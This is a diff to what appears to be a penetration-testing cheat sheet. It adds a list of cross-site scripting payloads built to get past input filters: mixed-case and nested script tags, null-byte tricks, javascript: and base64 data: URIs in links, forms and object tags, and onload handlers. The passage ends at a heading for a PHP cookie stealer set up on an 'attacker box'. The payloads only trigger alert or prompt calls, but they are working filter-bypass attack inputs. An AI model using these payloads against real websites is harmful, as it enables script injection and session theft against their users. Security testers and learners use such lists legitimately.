@@ -6175,9 +6175,31 @@ xprobe2 -v -p tcp:port_here:open IP_here
 
 ## XSS
 ```php
-# simple img payload
+# filter bypasses
+<sCrIpT>alert(1);</sCrIpT> # upper/lower case
+<sCrIpT>alert(1); # no closing tag
+<script/stuff>alert(1);</script> # random string after tag
+<script 
+>alert(1);</script> # new line
+<scr<script>ipt>alert(1);</scr</script>ipt># nested
+<scr\x00ipt>alert(1);</scr\x00ipt>  # null byte (IE)
+
+# href
+<a href="javascript:alert(1)">boomXSS</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">boomXSS</a>
+
+# form
+<form action="javascript:alert(1)"><button>boomXSS</button></form>
+<form id=x></form><button form="x" formaction="javascript:alert(1)">boomXSS</button>
+
+# img
 <img onload=alert(1)>
 <svg onload=prompt(1)>
+
+# object
+<object data="javascript:alert(1)">
+<object data="data:text/html,<script>alert(1)</script>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
 
 # cookie stealer (PHP)
 ## setup cookie stealer on attacker box
